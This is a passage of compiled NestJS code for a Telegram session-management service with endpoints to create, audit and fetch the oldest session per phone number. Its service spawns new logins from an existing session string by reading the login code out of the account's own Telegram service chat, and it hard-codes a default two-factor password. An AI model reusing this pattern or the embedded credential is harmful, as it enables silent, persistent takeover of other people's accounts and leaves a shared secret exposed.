    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionController = exports.GetOldestSessionDto = exports.SearchAuditDto = exports.CreateSessionDto = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const session_service_1 = __webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_2 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateSessionDto {
}
exports.CreateSessionDto = CreateSessionDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number with country code (optional if session provided)',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateSessionDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Existing session string to use',
        example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6zPg2CwJjFBw5wHkJfFpBVts...'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateSessionDto.prototype, "session", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Force creation of new session even if active session exists',
        default: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], CreateSessionDto.prototype, "forceNew", void 0);
class SearchAuditDto {
}
exports.SearchAuditDto = SearchAuditDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number to search for',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchAuditDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Session status to filter by',
        enum: ['created', 'active', 'expired', 'revoked', 'failed']
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchAuditDto.prototype, "status", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Number of records to return',
        default: 10,
        minimum: 1
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    __metadata("design:type", Number)
], SearchAuditDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Number of records to skip',
        default: 0,
        minimum: 0
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], SearchAuditDto.prototype, "offset", void 0);
class GetOldestSessionDto {
}
exports.GetOldestSessionDto = GetOldestSessionDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number to get session for',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GetOldestSessionDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Force creation of new session if no valid old session exists',
        default: true
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GetOldestSessionDto.prototype, "allowFallback", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Maximum age of session to consider (in days)',
        default: 180,
        minimum: 1,
        maximum: 365
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    __metadata("design:type", Number)
], GetOldestSessionDto.prototype, "maxAgeDays", void 0);
let SessionController = class SessionController {
    constructor(sessionService) {
        this.sessionService = sessionService;
    }
    async createSession(body) {
        try {
            if (!body.mobile && !body.session) {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Either mobile number or session string is required'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            if (!body.forceNew && body.mobile) {
                const validSessionResult = await this.sessionService.findRecentValidSession(body.mobile);
                if (validSessionResult.success && validSessionResult.session) {
                    try {
                        await this.sessionService.updateSessionLastUsed(body.mobile, validSessionResult.session.sessionString);
                    }
                    catch (updateError) {
                        console.log('Warning: Failed to update session last used timestamp:', updateError.message);
                    }
                    return {
                        success: true,
                        message: 'Valid session found from this month',
                        session: validSessionResult.session.sessionString,
                        isNew: false
                    };
                }
                else {
                    console.log('No valid session found from this month');
                }
            }
            const options = {
                mobile: body.mobile,
                oldSession: body.session
            };
            const result = await this.sessionService.createSession(options);
            if (result.success) {
                return {
                    success: true,
                    message: 'Session created successfully',
                    session: result.session,
                    isNew: true
                };
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: result.error,
                    retryable: result.retryable
                }, result.retryable ? common_1.HttpStatus.TOO_MANY_REQUESTS : common_1.HttpStatus.BAD_REQUEST);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            throw new common_1.HttpException({
                success: false,
                message: error.message || 'Failed to create/retrieve session'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async searchAudit(mobile, status, limit, offset) {
        try {
            const safeLimit = limit && !isNaN(Number(limit)) && Number(limit) > 0 ? Number(limit) : 10;
            const safeOffset = offset && !isNaN(Number(offset)) && Number(offset) >= 0 ? Number(offset) : 0;
            const options = {
                limit: safeLimit,
                offset: safeOffset
            };
            let result;
            if (mobile) {
                result = await this.sessionService.getSessionAuditHistory(mobile, {
                    ...options,
                    status: status
                });
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Mobile number is required for search'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            if (result.success) {
                return {
                    success: true,
                    data: result.data || [],
                    total: result.total || 0,
                    message: `Retrieved ${result.data?.length || 0} audit records`
                };
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: result.error || 'Failed to retrieve audit records'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            throw new common_1.HttpException({
                success: false,
                message: error.message || 'Failed to search audit records'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async getOldestSessionOrCreate(body) {
        try {
            if (!body.mobile || typeof body.mobile !== 'string' || body.mobile.trim().length === 0) {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Mobile number is required and must be a non-empty string',
                    code: 'INVALID_MOBILE'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            const mobile = body.mobile.trim();
            const allowFallback = body.allowFallback !== false;
            const maxAgeDays = body.maxAgeDays && body.maxAgeDays > 0 && body.maxAgeDays <= 365
                ? body.maxAgeDays
                : 180;
            const result = await this.sessionService.getOldestSessionOrCreate({
                mobile,
                allowFallback,
                maxAgeDays
            });
            if (result.success) {
                return result.data;
            }
            else {
                let httpStatus = common_1.HttpStatus.BAD_REQUEST;
                if (result.code === 'NO_SESSION_FOUND') {
                    httpStatus = common_1.HttpStatus.NOT_FOUND;
                }
                else if (result.code === 'RATE_LIMIT_EXCEEDED') {
                    httpStatus = common_1.HttpStatus.TOO_MANY_REQUESTS;
                }
                else if (result.code === 'FALLBACK_DISABLED') {
                    httpStatus = common_1.HttpStatus.NOT_FOUND;
                }
                throw new common_1.HttpException({
                    success: false,
                    message: result.message,
                    code: result.code,
                    retryable: result.retryable || false
                }, httpStatus);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            console.error('Unexpected error in getOldestSessionOrCreate:', error);
            throw new common_1.HttpException({
                success: false,
                message: 'An unexpected error occurred while processing your request',
                code: 'INTERNAL_ERROR'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
};
exports.SessionController = SessionController;
__decorate([
    (0, common_1.Post)('create'),
    (0, swagger_1.ApiOperation)({
        summary: 'Master session creation endpoint',
        description: 'Creates or retrieves a session based on provided parameters. If forceNew is true, always creates a new session. If forceNew is false, returns active session if exists and was used this month, otherwise creates new.'
    }),
    (0, swagger_1.ApiBody)({ type: CreateSessionDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Session created or retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                message: { type: 'string', example: 'Session created successfully' },
                session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },
                isNew: { type: 'boolean', example: true }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Bad request - validation failed or session creation failed'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [CreateSessionDto]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "createSession", null);
__decorate([
    (0, common_1.Get)('audit/search'),
    (0, swagger_1.ApiOperation)({
        summary: 'Search existing audit sessions',
        description: 'Search and retrieve session audit records based on various criteria'
    }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, type: String, description: 'Phone number to search for' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, enum: ['created', 'active', 'expired', 'revoked', 'failed'], description: 'Filter by session status' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of records to return (default: 10)' }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: Number, description: 'Number of records to skip (default: 0)' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Audit records retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                data: {
                    type: 'array',
                    items: {
                        type: 'object',
                        properties: {
                            mobile: { type: 'string', example: '916265240911' },
                            sessionString: { type: 'string', example: '1BQANOTEuM==...' },
                            status: { type: 'string', example: 'active' },
                            creationMethod: { type: 'string', example: 'old_session' },
                            createdAt: { type: 'string', example: '2023-12-01T10:00:00Z' },
                            lastUsedAt: { type: 'string', example: '2023-12-01T15:30:00Z' },
                            usageCount: { type: 'number', example: 5 }
                        }
                    }
                },
                total: { type: 'number', example: 25 },
                message: { type: 'string', example: 'Audit records retrieved successfully' }
            }
        }
    }),
    __param(0, (0, common_1.Query)('mobile')),
    __param(1, (0, common_1.Query)('status')),
    __param(2, (0, common_1.Query)('limit')),
    __param(3, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "searchAudit", null);
__decorate([
    (0, common_1.Post)('oldest'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get oldest valid session or create new session as fallback',
        description: 'Returns the oldest valid session for the mobile number. If no valid session exists and allowFallback is true, creates a new session as fallback. This endpoint is optimized for stability and reliability.'
    }),
    (0, swagger_1.ApiBody)({ type: GetOldestSessionDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Session retrieved or created successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                message: { type: 'string', example: 'Oldest session retrieved successfully' },
                data: {
                    type: 'object',
                    properties: {
                        session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },
                        sessionAge: { type: 'number', example: 5, description: 'Age of session in days' },
                        isNew: { type: 'boolean', example: false, description: 'Whether this is a newly created session' },
                        usageCount: { type: 'number', example: 12, description: 'Number of times this session has been used' },
                        lastUsedAt: { type: 'string', example: '2024-08-05T10:30:00Z', description: 'When the session was last used' },
                        createdAt: { type: 'string', example: '2024-08-01T14:20:00Z', description: 'When the session was created' }
                    }
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Bad request - validation failed or no session available'
    }),
    (0, swagger_1.ApiResponse)({
        status: 404,
        description: 'No valid session found and fallback disabled'
    }),
    (0, swagger_1.ApiResponse)({
        status: 429,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: 500,
        description: 'Internal server error'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [GetOldestSessionDto]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "getOldestSessionOrCreate", null);
exports.SessionController = SessionController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Session Management'),
    (0, common_1.Controller)('telegram/session'),
    (0, common_1.UsePipes)(new common_1.ValidationPipe({ transform: true, whitelist: true })),
    __metadata("design:paramtypes", [session_service_1.SessionService])
], SessionController);


/***/ }),

/***/ "./src/components/session-manager/session.module.ts":
/*!**********************************************************!*\
  !*** ./src/components/session-manager/session.module.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const session_controller_1 = __webpack_require__(/*! ./session.controller */ "./src/components/session-manager/session.controller.ts");
const session_service_1 = __webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts");
const session_audit_service_1 = __webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
let SessionModule = class SessionModule {
};
exports.SessionModule = SessionModule;
exports.SessionModule = SessionModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: sessions_schema_1.SessionAudit.name, schema: sessions_schema_1.SessionAuditSchema }
            ])
        ],
        controllers: [session_controller_1.SessionController],
        providers: [session_service_1.SessionService, session_audit_service_1.SessionAuditService],
        exports: [session_service_1.SessionService, session_audit_service_1.SessionAuditService]
    })
], SessionModule);


/***/ }),

/***/ "./src/components/session-manager/session.service.ts":
/*!***********************************************************!*\
  !*** ./src/components/session-manager/session.service.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionService = exports.SessionManager = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const client_registry_1 = __webpack_require__(/*! ./client-registry */ "./src/components/session-manager/client-registry.ts");
const session_audit_service_1 = __webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
class SessionManager {
    constructor() {
        this.logger = new telegram_logger_1.TelegramLogger('SessionManager');
        this.clientRegistry = client_registry_1.ClientRegistry.getInstance();
        this.DEFAULT_PASSWORD = "Ajtdmwajt1@";
        this.DEFAULT_MAX_RETRIES = 3;
        this.DEFAULT_RETRY_DELAY = 5000;
        this.OTP_WAIT_TIME = 120000;
        this.OTP_CHECK_INTERVAL = 3000;
    }
    getApiId() {
        const apiId = parseInt(process.env.API_ID);
        if (isNaN(apiId)) {
            throw new Error('Invalid API_ID: must be a number');
        }
        return apiId;
    }
    getApiHash() {
        const apiHash = process.env.API_HASH;
        if (!apiHash) {
            throw new Error('API_HASH environment variable is required');
        }
        return apiHash;
    }
    static getInstance() {
        if (!SessionManager.instance) {
            SessionManager.instance = new SessionManager();
        }
        return SessionManager.instance;
    }
    async createSession(options) {
        const { mobile, oldSession, password = this.DEFAULT_PASSWORD } = options;
        if (!mobile) {
            return { success: false, error: 'Mobile number is required', retryable: false };
        }
        this.logger.info(mobile, 'Starting session creation process with priority order');
        const existingCheck = this.checkExistingSession(mobile);
        if (!existingCheck.canProceed) {
            return existingCheck.result;
        }
        const strategies = this.getCreationStrategies(options);
        this.logger.info(mobile, `Available strategies: ${strategies.map(s => s.strategyName).join(', ')}`);
        for (const strategy of strategies) {
            try {
                this.logger.info(mobile, `Attempting strategy: ${strategy.strategyName}`);
                const result = await strategy();
                if (result.success) {
                    this.logger.info(mobile, ` Session creation successful with ${strategy.strategyName}`);
                    return result;
                }
                this.logger.info(mobile, ` Strategy ${strategy.strategyName} failed: ${result.error}`);
            }
            catch (error) {
                this.logger.error(mobile, ` Strategy ${strategy.strategyName} threw error`, error);
            }
        }
        return { success: false, error: 'All SessionManager strategies failed', retryable: false };
    }
    checkExistingSession(mobile) {
        if (!mobile || typeof mobile !== 'string') {
            return {
                canProceed: false,
                result: { success: false, error: 'Invalid mobile number provided', retryable: false }
            };
        }
        if (this.clientRegistry.hasClient(mobile)) {
            const clientInfo = this.clientRegistry.getClientInfo(mobile);
            if (clientInfo?.isCreating) {
                return {
                    canProceed: false,
                    result: { success: false, error: 'Session creation already in progress', retryable: true }
                };
            }
            return {
                canProceed: false,
                result: { success: false, error: 'Active session exists. Use cleanup first.', retryable: false }
            };
        }
        return { canProceed: true };
    }
    getCreationStrategies(options) {
        const strategies = [];
        if (options.oldSession) {
            const strategyFunction = () => this.createFromOldSession(options);
            strategyFunction.strategyName = 'oldSession';
            strategies.push(strategyFunction);
        }
        if (options.mobile) {
            const strategyFunction = () => this.createFromExistingManager(options.mobile);
            strategyFunction.strategyName = 'existingManager';
            strategies.push(strategyFunction);
        }
        return strategies;
    }
    async createFromOldSession(options) {
        const { oldSession, mobile, password, maxRetries = this.DEFAULT_MAX_RETRIES, retryDelay = this.DEFAULT_RETRY_DELAY } = options;
        const validation = await this.validateSession(oldSession, mobile);
        if (!validation.isValid) {
            return { success: false, error: `Session validation failed: ${validation.error}`, retryable: false };
        }
        const lockId = await this.clientRegistry.waitForLock(mobile);
        try {
            this.clientRegistry.markClientCreating(mobile, lockId);
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    const newSession = await this.performSessionCreation(oldSession, mobile, password, attempt);
                    return { success: true, session: newSession };
                }
                catch (error) {
                    const errorMessage = error.message || error.toString();
                    const isRetryable = this.isRetryableError(errorMessage);
                    if (!isRetryable || attempt === maxRetries) {
                        return { success: false, error: errorMessage, retryable: isRetryable };
                    }
                    if (attempt < maxRetries) {
                        await (0, utils_1.sleep)(retryDelay);
                    }
                }
            }
            return { success: false, error: 'Max retries exceeded', retryable: false };
        }
        finally {
            if (lockId) {
                await this.clientRegistry.removeClient(mobile, lockId);
                this.clientRegistry.releaseLock(mobile, lockId);
            }
        }
    }
    async createFromExistingManager(mobile) {
        try {
            const client = await connection_manager_1.connectionManager.getClient(mobile);
            const newSession = await client.createNewSession();
            return { success: true, session: newSession };
        }
        catch (error) {
            return {
                success: false,
                error: error.message || 'Existing manager method failed',
                retryable: this.isRetryableError(error.message)
            };
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    async validateSession(sessionString, mobile) {
        let tempClient = null;
        try {
            tempClient = new telegram_1.TelegramClient(new sessions_1.StringSession(sessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await tempClient.connect();
            const userInfo = await tempClient.getMe();
            if (!userInfo || userInfo.phone !== mobile) {
                return { isValid: false, error: 'Phone number mismatch or invalid user info' };
            }
            this.logger.info(mobile, 'Session validation successful');
            await this.cleanupClient(tempClient, mobile);
            return { isValid: true, userInfo };
        }
        catch (error) {
            this.logger.error(mobile, 'Session validation failed', error);
            await this.cleanupClient(tempClient, mobile);
            return { isValid: false, error: error.message || error.toString() || error.errorMessage };
        }
        finally {
        }
    }
    async performSessionCreation(oldSessionString, mobile, password, attempt) {
        let oldClient = null;
        let newClient = null;
        try {
            oldClient = new telegram_1.TelegramClient(new sessions_1.StringSession(oldSessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await oldClient.connect();
            await oldClient.getMe();
            newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await newClient.start({
                phoneNumber: mobile,
                password: async () => password,
                phoneCode: async () => this.waitForOtp(oldClient, mobile, attempt),
                onError: (err) => {
                    throw new Error(`Session start error: ${err.message || err}`);
                }
            });
            return newClient.session.save();
        }
        finally {
            await Promise.all([
                this.cleanupClient(newClient, mobile),
                this.cleanupClient(oldClient, mobile)
            ]);
        }
    }
    async waitForOtp(oldClient, mobile, attempt) {
        const startTime = Date.now();
        this.logger.info(mobile, `Waiting for OTP (attempt ${attempt})`);
        while (Date.now() - startTime < this.OTP_WAIT_TIME) {
            try {
                const messages = await oldClient.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && (message.date * 1000) > (Date.now() - 120000)) {
                    const messageText = message.text || message.message || '';
                    if (messageText) {
                        const code = this.extractOtpCode(messageText.toLowerCase());
                        if (code) {
                            this.logger.info(mobile, `OTP extracted: ${code}`);
                            return code;
                        }
                    }
                }
                await (0, utils_1.sleep)(this.OTP_CHECK_INTERVAL);
            }
            catch (error) {
                this.logger.error(mobile, 'Error checking OTP messages', error);
                await (0, utils_1.sleep)(this.OTP_CHECK_INTERVAL);
            }
        }
        throw new Error(`OTP timeout after ${this.OTP_WAIT_TIME}ms`);
    }
    extractOtpCode(messageText) {
        const patterns = [
            /code:\*\*(\d{5,6})/,
            /login code:\s*(\d{5,6})/,
            /your code is\s*(\d{5,6})/,
            /verification code:\s*(\d{5,6})/,
            /\b(\d{5,6})\b/
        ];
        for (const pattern of patterns) {
            const match = messageText.match(pattern);
            if (match)
                return match[1];
        }
        return null;
    }
    async cleanupClient(client, mobile) {
        if (!client)
            return;
        try {
            if (client._destroyed) {
                this.logger.info(mobile, 'Client already destroyed, skipping cleanup');
                return;
            }
            await client.destroy();
            if (client._eventBuilders) {
                client._eventBuilders = [];
            }
            connection_manager_1.connectionManager.unregisterClient(mobile);
            await (0, utils_1.sleep)(1000);
        }
        catch (error) {
            this.logger.error(mobile, 'Client cleanup error', error);
        }
        finally {
            if (client) {
                try {
                    client._destroyed = true;
                    if (client._sender && typeof client._sender.disconnect === 'function') {
                        await client._sender.disconnect().catch(() => { });
                    }
                }
                catch (finalCleanupError) {
                    this.logger.error(mobile, 'Final cleanup error', finalCleanupError);
                }
                this.logger.info(mobile, 'Client cleanup completed');
            }
        }
    }
    isRetryableError(errorMessage) {
        const nonRetryableErrors = [
            'user_deactivated_ban', 'auth_key_unregistered', 'session_revoked',
            'phone_number_banned', 'user_deactivated', 'phone_number_invalid',
            'session_password_needed'
        ];
        const retryableErrors = [
            'timeout', 'network_error', 'connection_error', 'flood_wait', 'internal_server_error'
        ];
        const lowerErrorMessage = errorMessage.toLowerCase();
        if (nonRetryableErrors.some(error => lowerErrorMessage.includes(error))) {
            return false;
        }
        if (retryableErrors.some(error => lowerErrorMessage.includes(error))) {
            return true;
        }
        return true;
    }
    getSessionStatus(mobile) {
        const clientInfo = this.clientRegistry.getClientInfo(mobile);
        if (!clientInfo) {
            return { status: 'inactive', activeClients: 0 };
        }
        return {
            status: clientInfo.isCreating ? 'creating' : 'active',
            activeClients: 1,
            lastActivity: clientInfo.lastActivity
        };
    }
    async cleanupSessions(mobile, force = false) {
        try {
            const clientInfo = this.clientRegistry.getClientInfo(mobile);
            if (!clientInfo) {
                return { success: true, cleanedCount: 0 };
            }
            if (clientInfo.isCreating && !force) {
                return {
                    success: false,
                    cleanedCount: 0,
                    error: 'Session creation in progress. Use force=true to cleanup anyway.'
                };
            }
            const cleanedCount = await this.clientRegistry.forceCleanup(mobile);
            return { success: true, cleanedCount };
        }
        catch (error) {
            return {
                success: false,
                cleanedCount: 0,
                error: error.message || 'Cleanup failed'
            };
        }
    }
    getRegistryStats() {
        return this.clientRegistry.getStats();
    }
}
exports.SessionManager = SessionManager;
SessionManager.instance = null;
let SessionService = class SessionService {
    constructor(sessionAuditService) {
        this.logger = new telegram_logger_1.TelegramLogger('SessionService');
        this.sessionManager = SessionManager.getInstance();
        this.rateLimitMap = new Map();
        this.MAX_SESSIONS_PER_HOUR = 20;
        this.RATE_LIMIT_WINDOW = 3600000;
        this.sessionAuditService = sessionAuditService;
    }
    getApiId() {
        const apiId = process.env.API_ID;
        if (!apiId) {
            throw new Error('API_ID environment variable is required');
        }
        const parsedApiId = parseInt(apiId);
        if (isNaN(parsedApiId)) {
            throw new Error('Invalid API_ID: must be a number');
        }
        return parsedApiId;
    }
    getApiHash() {
        const apiHash = process.env.API_HASH;
        if (!apiHash) {
            throw new Error('API_HASH environment variable is required');
        }
        return apiHash;
    }
    checkRateLimit(mobile) {
        const now = Date.now();
        const rateLimit = this.rateLimitMap.get(mobile);
        if (rateLimit && now > rateLimit.resetTime) {
            this.rateLimitMap.delete(mobile);
        }
        const currentLimit = this.rateLimitMap.get(mobile);
        if (!currentLimit) {
            this.rateLimitMap.set(mobile, { count: 1, resetTime: now + this.RATE_LIMIT_WINDOW });
            return { allowed: true };
        }
        if (currentLimit.count >= this.MAX_SESSIONS_PER_HOUR) {
            return { allowed: false, resetTime: currentLimit.resetTime };
        }
        currentLimit.count++;
        return { allowed: true };
    }
    async extractMobileFromSession(sessionString) {
        let tempClient = null;
        try {
            tempClient = new telegram_1.TelegramClient(new sessions_1.StringSession(sessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await tempClient.connect();
            const userInfo = await tempClient.getMe();
            if (!userInfo || !userInfo.phone) {
                return { error: 'Unable to extract phone number from session' };
            }
            return { mobile: userInfo.phone };
        }
        catch (error) {
            return { error: error.message || error.toString() };
        }
        finally {
            if (tempClient) {
                try {
                    await tempClient.destroy();
                    tempClient._eventBuilders = [];
                    await (0, utils_1.sleep)(1000);
                }
                catch (cleanupError) {
                }
                finally {
                    if (tempClient) {
                        tempClient._destroyed = true;
                        if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {
                            await tempClient._sender.disconnect().catch(() => { });
                        }
                    }
                }
            }
        }
    }
    async createSession(options) {
        if (!options || typeof options !== 'object') {
            return { success: false, error: 'Invalid options provided', retryable: false };
        }
        let mobile = options.mobile;
        if (!mobile && options.oldSession) {
            try {
                const extractResult = await this.extractMobileFromSession(options.oldSession);
                if (extractResult.error) {
                    return { success: false, error: `Failed to extract mobile from session: ${extractResult.error}`, retryable: false };
                }
                mobile = extractResult.mobile;
                options.mobile = mobile;
            }
            catch (error) {
                return { success: false, error: `Error extracting mobile from session: ${error.message}`, retryable: false };
            }
        }
        this.logger.info(mobile || 'unknown', 'Service: Creating session with priority order: 1.Old Session -> 2.Existing Manager -> 3.Audit Sessions');
        if (!mobile || typeof mobile !== 'string') {
            return { success: false, error: 'Mobile number is required or must be extractable from session', retryable: false };
        }
        const rateLimitCheck = this.checkRateLimit(mobile);
        if (!rateLimitCheck.allowed) {
            const resetTime = new Date(rateLimitCheck.resetTime || 0);
            return {
                success: false,
                error: `Rate limit exceeded. Try again after ${resetTime.toISOString()}`,
                retryable: true
            };
        }
        try {
            if (options.oldSession) {
                this.logger.info(mobile, 'Trying with provided old session (Priority 1)');
                const result = await this.sessionManager.createSession(options);
                if (result.success && result.session) {
                    await this.updateAuditOnSuccess(mobile, result.session, sessions_schema_1.SessionCreationMethod.INPUT_SESSION);
                    return result;
                }
                else {
                    this.logger.info(mobile, `Old session failed: ${result.error}`);
                }
            }
            this.logger.info(mobile, 'Trying with existing manager (Priority 2)');
            const managerResult = await this.sessionManager.createSession({
                ...options,
                oldSession: undefined
            });
            if (managerResult.success && managerResult.session) {
                await this.updateAuditOnSuccess(mobile, managerResult.session, sessions_schema_1.SessionCreationMethod.USER_MOBILE);
                return managerResult;
            }
            else {
                this.logger.info(mobile, `Existing manager failed: ${managerResult.error}`);
            }
            this.logger.info(mobile, 'Trying with audit sessions (Priority 3)');
            const auditResult = await this.tryAuditSessions(mobile, options);
            if (auditResult.success) {
                await this.updateAuditOnSuccess(mobile, auditResult.session, sessions_schema_1.SessionCreationMethod.OLD_SESSION);
                return auditResult;
            }
            else {
                this.logger.info(mobile, `Audit sessions failed: ${auditResult.error}`);
            }
            const finalError = 'All session creation strategies failed: old session, existing manager, and audit sessions';
            this.logger.warn(mobile, finalError);
            return {
                success: false,
                error: finalError,
                retryable: false
            };
        }
        catch (error) {
            (0, utils_1.parseError)(error, `Error While generating new Session`);
            return {
                success: false,
